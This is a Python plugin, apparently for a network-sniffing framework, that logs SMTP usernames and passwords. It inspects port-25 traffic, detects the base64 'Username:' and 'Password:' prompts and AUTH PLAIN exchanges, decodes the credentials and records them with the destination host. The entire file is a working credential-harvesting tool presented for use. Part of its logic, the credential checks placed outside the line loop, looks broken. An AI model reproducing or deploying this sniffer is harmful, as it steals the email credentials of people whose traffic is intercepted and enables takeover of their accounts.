import base64
"""SMTP password logger"""
PROPERTY={}
PROPERTY['NAME']="SMTP Logger"
PROPERTY['DESC']="This logs all the SMTP accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=25
PROPERTY['DPORT']=25
user = None
passwd = None
count = 0

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd, count

        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            # next packet will be username
            if("VXNlcm5hbWU6" in line):
                count = 1
            # next packet will be password
            if("UGFzc3dvcmQ6" in line):
                count = 2
            elif(line[:10].lower() == "auth plain"):
            	line = line.split(' ')
            	try:
            	    # authid\x00userid\x00passwd
            	    auth_string = base64.b64decode(line[2]).split("\x00")
            	    user = auth_string[1]
            	    passwd = auth_string[2]
            	except(TypeError): pass
        # set username and password
        if(count == 1 and line != ""):
        	user = base64.b64decode(line)
        	count = 0
        if(count == 2 and line != ""):
        	passwd = base64.b64decode(line)
        	count = 0
        if (user != None and passwd != None):
                self.logger.addInfo('SMTP',self.traffic.dst,user,passwd)
                user = None
                passwd = None
